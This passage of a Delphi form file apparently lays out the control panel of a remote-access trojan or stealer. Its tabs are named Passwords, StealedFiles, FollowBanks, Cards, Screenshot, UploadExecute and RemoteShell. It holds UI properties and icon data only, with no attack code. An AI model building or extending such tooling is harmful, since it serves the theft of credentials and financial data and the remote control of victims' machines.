        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = FollowBanks
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab12'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = Cards
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab13'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = UploadExecute
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab14'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end>
    TabIndex = 4
    ActivePage = RemoteShell
    StorePaintBuffer = False
    FreeOnClose = False
    object Passwords: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 9
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
    end
    object UploadExecute: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 10
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
      object scGPButton9: TscGPButton
        Left = 111
        Top = 255
        Width = 210
        Height = 26
        Font.Charset = DEFAULT_CHARSET
        Font.Color = clWindowText
        Font.Height = -12
        Font.Name = 'JetBrains Mono'
        Font.Style = []
        ParentFont = False
        FluentUIOpaque = False
        TabOrder = 0
        TabStop = True
        OnClick = scGPButton9Click
        Animation = True
        Badge.Color = clRed
        Badge.ColorAlpha = 255
        Badge.Font.Charset = DEFAULT_CHARSET
        Badge.Font.Color = clWhite
        Badge.Font.Height = -11
        Badge.Font.Name = 'Tahoma'
        Badge.Font.Style = [fsBold]
        Badge.Visible = False
        Caption = '  Upload And Execute File'
        CaptionCenterAlignment = False
        CanFocused = True
        CustomDropDown = False
        DrawTextMode = scdtmGDI
        Margin = -1
        Spacing = 1
        Layout = blGlyphLeft
        Images = VirtualImageList1
        ImageIndex = 19
        ImageMargin = 1
        TransparentBackground = True
        Options.NormalColor = 2428680
        Options.HotColor = 3479824
        Options.PressedColor = 2428680
        Options.FocusedColor = 2428680
        Options.DisabledColor = 2428680
        Options.NormalColor2 = 2428680
        Options.HotColor2 = 3479824
        Options.PressedColor2 = 2428680
        Options.FocusedColor2 = clNone
        Options.DisabledColor2 = clNone
        Options.NormalColorAlpha = 255
        Options.HotColorAlpha = 255
        Options.PressedColorAlpha = 255
        Options.FocusedColorAlpha = 255
        Options.DisabledColorAlpha = 255
        Options.NormalColor2Alpha = 255
        Options.HotColor2Alpha = 255
        Options.PressedColor2Alpha = 255
        Options.FocusedColor2Alpha = 255
        Options.DisabledColor2Alpha = 255
        Options.FrameNormalColor = 4599078
        Options.FrameHotColor = 4599078
        Options.FramePressedColor = 4599078
        Options.FrameFocusedColor = 4599078
        Options.FrameDisabledColor = 14968160
        Options.FrameWidth = 1
        Options.FrameNormalColorAlpha = 255
        Options.FrameHotColorAlpha = 255
        Options.FramePressedColorAlpha = 255
        Options.FrameFocusedColorAlpha = 255
        Options.FrameDisabledColorAlpha = 255
        Options.FontNormalColor = 14968160
        Options.FontHotColor = 14968160
        Options.FontPressedColor = 14968160
        Options.FontFocusedColor = 14968160
        Options.FontDisabledColor = 14968160
        Options.ShapeFillGradientAngle = 90
        Options.ShapeFillGradientPressedAngle = -90
        Options.ShapeFillGradientColorOffset = 25
        Options.ShapeCornerRadius = 10
        Options.ShapeStyle = scgpRect
        Options.ShapeStyleLineSize = 0
        Options.ArrowSize = 9
        Options.ArrowAreaSize = 0
        Options.ArrowType = scgpatDefault
        Options.ArrowThickness = 2
        Options.ArrowThicknessScaled = False
        Options.ArrowNormalColor = 2428680
        Options.ArrowHotColor = clBtnText
        Options.ArrowPressedColor = clBtnText
        Options.ArrowFocusedColor = clBtnText
        Options.ArrowDisabledColor = clBtnText
        Options.ArrowNormalColorAlpha = 200
        Options.ArrowHotColorAlpha = 255
        Options.ArrowPressedColorAlpha = 255
        Options.ArrowFocusedColorAlpha = 200
        Options.ArrowDisabledColorAlpha = 125
        Options.StyleColors = True
        Options.PressedHotColors = False
        HotImageIndex = -1
        FluentLightEffect = False
        FocusedImageIndex = -1
        PressedImageIndex = -1
        UseGalleryMenuImage = False
        UseGalleryMenuCaption = False
        ScaleMarginAndSpacing = False
        WidthWithCaption = 0
        WidthWithoutCaption = 0
        SplitButton = False
        RepeatClick = False
        RepeatClickInterval = 100
        GlowEffect.Enabled = False
        GlowEffect.Color = clHighlight
        GlowEffect.AlphaValue = 255
        GlowEffect.GlowSize = 7
        GlowEffect.Offset = 0
        GlowEffect.Intensive = True
        GlowEffect.StyleColors = True
        GlowEffect.HotColor = clNone
        GlowEffect.PressedColor = clNone
        GlowEffect.FocusedColor = clNone
        GlowEffect.PressedGlowSize = 7
        GlowEffect.PressedAlphaValue = 255
        GlowEffect.States = [scsHot, scsPressed, scsFocused]
        ImageGlow = True
        ShowGalleryMenuFromTop = False
        ShowGalleryMenuFromRight = False
        ShowMenuArrow = True
        ShowFocusRect = True
        Down = False
        GroupIndex = 0
        AllowAllUp = False
        ToggleMode = False
      end
      object scGPPanel13: TscGPPanel
        Left = 3
        Top = 3
        Width = 414
        Height = 230
        FluentUIOpaque = False
        TabOrder = 1
        BlurBackground = False
        BlurBackgroundAmount = 5
        BackgroundStyle = gppbsColor
        ContentMarginLeft = 0
        ContentMarginRight = 0
        ContentMarginTop = 0
        ContentMarginBottom = 0
        CustomImageIndex = -1
        DragForm = False
        DragTopForm = True
        DrawTextMode = scdtmGDI
        FillGradientAngle = 90
        FillGradientBeginAlpha = 255
        FillGradientEndAlpha = 255
        FillGradientBeginColorOffset = 25
        FillGradientEndColorOffset = 25
        FrameWidth = 1
        FillColor = 3479824
        FillColorAlpha = 255
        FillColor2 = 3479824
        FrameColor = 4599078
        FrameColorAlpha = 255
        FrameRadius = 5
        ShowCaption = False
        CaptionGlowEffect.Enabled = False
        CaptionGlowEffect.Color = clBtnShadow
        CaptionGlowEffect.AlphaValue = 255
        CaptionGlowEffect.GlowSize = 7
        CaptionGlowEffect.Offset = 0
        CaptionGlowEffect.Intensive = True
        CaptionGlowEffect.StyleColors = True
        Color = 2428680
        Caption = 'scGPPanel3'
        TransparentBackground = True
        StorePaintBuffer = True
        Sizeable = False
        WallpaperIndex = -1
        WordWrap = False
        object Label14: TLabel
          Left = 41
          Top = 18
          Width = 28
          Height = 16
          Caption = 'Logs'
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
        end
        object scGPImage5: TscGPImage
          Left = 15
          Top = 16
          Width = 20
          Height = 20
          FluentUIOpaque = False
          TabOrder = 0
          CustomImageIndex = -1
          DragForm = False
          DragTopForm = True
          StyleKind = scpsPanel
          ShowCaption = False
          BorderStyle = scpbsNone
          WallpaperIndex = -1
          LightBorderColor = 3479824
          ShadowBorderColor = 3479824
          CaptionGlowEffect.Enabled = False
          CaptionGlowEffect.Color = clBtnShadow
          CaptionGlowEffect.AlphaValue = 255
          CaptionGlowEffect.GlowSize = 7
          CaptionGlowEffect.Offset = 0
          CaptionGlowEffect.Intensive = True
          CaptionGlowEffect.StyleColors = True
          Color = 3479824
          Caption = 'scGPImage1'
          StorePaintBuffer = False
          WordWrap = False
          ImageIndex = -1
          InterpolationMode = scgppimDefault
          ClipFrame = scgpcfNone
          ClipFrameRadius = 10
          ClipFrameFillColor = 3479824
          ClipFrameFillColorAlpha = 150
          ClipFrameColor = 3479824
          ClipFrameWidth = 2
          DrawTextMode = scdtmGDI
          RotationAngle = 0
          AnimationAcceleration = False
          RotateAnimation = False
          Picture.Data = {
            0954506E67496D61676589504E470D0A1A0A0000000D49484452000000200000
            00200806000000737A7AF400000006624B474400FF00FF00FFA0BDA793000000
            AC4944415478DA63641860C038EA80510710A3E8FFFFFFA2402A9891917106DD
            1D00B57C2F10EB027136D011D368EE00A0A519406A2D940BB3FC0A103B011DF0
            1A49DD7F922D0402BC0E009A990DA4A600F165A810CC7267A0DE57686A69E200
            3120B50F88B5A142D780D811DD726A015C512000A4F640B9AE40CBDFD3C2729C
            0E803A420244012D7F492BCBF13A805E60B41C182D0746CB81D17260B41C182D
            0746CB81D17260D40103EE00001BEB8D21CD78891B0000000049454E44AE4260
            82}
          Stretch = True
          Transparent = True
        end
      end
    end
    object StealedFiles: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 11
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
    end
    object Screenshot: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 7
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
      object scGPPanel4: TscGPPanel
        Left = 3
        Top = 3
        Width = 414
        Height = 313
        FluentUIOpaque = False
        TabOrder = 0
        BlurBackground = False
        BlurBackgroundAmount = 5
        BackgroundStyle = gppbsColor
        ContentMarginLeft = 0
        ContentMarginRight = 0
        ContentMarginTop = 0
        ContentMarginBottom = 0
        CustomImageIndex = -1
        DragForm = False
        DragTopForm = True
        DrawTextMode = scdtmGDI
        FillGradientAngle = 90
        FillGradientBeginAlpha = 255
        FillGradientEndAlpha = 255
        FillGradientBeginColorOffset = 25
        FillGradientEndColorOffset = 25
        FrameWidth = 1
        FillColor = 3479824
        FillColorAlpha = 255
        FillColor2 = 3479824
        FrameColor = 4599078
        FrameColorAlpha = 255
        FrameRadius = 5
        ShowCaption = False
        CaptionGlowEffect.Enabled = False
        CaptionGlowEffect.Color = clBtnShadow
        CaptionGlowEffect.AlphaValue = 255
        CaptionGlowEffect.GlowSize = 7
        CaptionGlowEffect.Offset = 0
        CaptionGlowEffect.Intensive = True
        CaptionGlowEffect.StyleColors = True
        Color = 2428680
        Caption = 'scGPPanel3'
        TransparentBackground = True
        StorePaintBuffer = True
        Sizeable = False
        WallpaperIndex = -1
        WordWrap = False
        object Label6: TLabel
          Left = 41
          Top = 17
          Width = 70
          Height = 16
          Caption = 'Screenshot'
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
        end
        object Image4: TImage
          Left = 41
          Top = 39
          Width = 326
          Height = 209
          Stretch = True
        end
        object scGPImage4: TscGPImage
          Left = 19
          Top = 17
          Width = 16
          Height = 16
          FluentUIOpaque = False
          TabOrder = 0
          CustomImageIndex = -1
          DragForm = False
          DragTopForm = True
          StyleKind = scpsPanel
          ShowCaption = False
          BorderStyle = scpbsNone
          WallpaperIndex = -1
          LightBorderColor = 3479824
          ShadowBorderColor = 3479824
          CaptionGlowEffect.Enabled = False
          CaptionGlowEffect.Color = clBtnShadow
          CaptionGlowEffect.AlphaValue = 255
          CaptionGlowEffect.GlowSize = 7
          CaptionGlowEffect.Offset = 0
          CaptionGlowEffect.Intensive = True
          CaptionGlowEffect.StyleColors = True
          Color = 3479824
          Caption = 'scGPImage1'
          StorePaintBuffer = False
          WordWrap = False
          ImageIndex = -1
          InterpolationMode = scgppimDefault
          ClipFrame = scgpcfNone
          ClipFrameRadius = 10
          ClipFrameFillColor = 3479824
          ClipFrameFillColorAlpha = 150
          ClipFrameColor = 3479824
          ClipFrameWidth = 2
          DrawTextMode = scdtmGDI
          RotationAngle = 0
          AnimationAcceleration = False
          RotateAnimation = False
          Picture.Data = {
            0954506E67496D61676589504E470D0A1A0A0000000D49484452000000100000
            001008060000001FF3FF6100000006624B474400FF00FF00FFA0BDA793000003
            5C4944415478DA75935D4C536718C7FFEF39A75F94D3524B411C9B7343310189
            4B96B1B5D0818DB590B1CDA186B00C154DD00B77B5C4A05E706134CBBE1276B5
            C448606816CDF0139A882E52109B61C0588BB8F911630C1D960E3C6D6D39E73D
            67A7A7DA648B7BAF9EBC1FBFF779FECFFF21F89FD5B7EFA32696618E1135A632
            6DFFE2C7C1C157DD232F03A5AB8BB93E365621E97411B7DFFFF4C4971F4737D4
            39ED9015FC16B81EFDBCFBBC63E87883839569B177D7A530215072003522133E
            DF30C371D59228AA1BCACEBB65DCE9B6D6CFB2D99C1CC06BEF285B09CBF57006
            1D64510AD66D3FEFCD403440D0E3A9E28CC6B10A8F874FC5E3B8373E9E785C0A
            F3E61D5BB280730378BD824BBE57BF29CFCCF3181D3C2BA49329D7C68EA19006
            083434388C943E2C73B9CC268B052941C0CC9D119437BA215808AE4E07D1DCDA
            08336F85B0F03726AE5E4A302279B3BEE34234A741D0EB6D2184F4AC763A8D19
            C8D4A41F26DE8C47E57A24D249B4EEDEA63DBE11184E514AB76FDC35744AD3A0
            6F7F5F13CB31C7A425A9C8323F8BE58FC280C1005ABCA4A43187C82A1DAC2BEC
            F843AF27C9A53428F4B88F656059764EA6723B3971A03FFABEE703BB63B943CB
            241EBE8DD9B3BF624122B269EE4679BC4547EE1A56CCC8EA2F25A56B50F0D6BB
            DABD482C86919B5351D2DFF973CCE5ADB1D98BECDAC1E4D434FEBCF3106A9ACA
            332A9647569691E7F9B33366A38DAC7B9BA0C491AD7A4E2DE7CAD4E47CB60486
            E99524C996CAF445ED2967D0633EDFA23C5E4C28B4A808D61291082999501948
            CBB7D532FE02C77031D5606D3911BFDFDFD7C2B06C4F6DA3DB68B559F153FF45
            E84C7958E46D50B9D8D6E2C6E24202E381504A5645FC7A6FCDA99C918E741E77
            986078E06EACCDB72E2B50D51670F2DC65582BAB115728A2B34FB0B9D9059ECF
            D320D7466EC545A4577DD7519F6DE3375FF55699F8BC315FF3265E581430E20F
            2426248379FD871BB4EC42377F4769A125595357A51AC98461FF8490884BAE1F
            F639432FACAC90EE83BF0C333AB65A5A1241256967802B3C5D5BEBD200A3A3D7
            B0F68D82AD0CC3F4701C971138787477B557AD4DC969D0A50E93E5F9CA8A14A3
            440E1C6D7FFAE9217FAC725DA52D830F87A6E7CF1CF6157676071CA28E2DFE76
            8F339C79FCAF69FCEFFAE4E05093EACC5E92F985A26DE088EF95E3FC0FB4D065
            66087AFE850000000049454E44AE426082}
          Stretch = True
          Transparent = True
        end
        object scGPButton4: TscGPButton
          Left = 19
          Top = 255
          Width = 174
          Height = 33
          FluentUIOpaque = False
          TabOrder = 1
          OnClick = scGPButton4Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '          Get Screenshot'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 27
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
        object scGPButton5: TscGPButton
          Left = 211
          Top = 255
          Width = 174
          Height = 33
          FluentUIOpaque = False
          TabOrder = 2
          OnClick = scGPButton5Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '          Save Screenshot'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 27
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
      end
    end
    object FollowBanks: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 13
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
    end
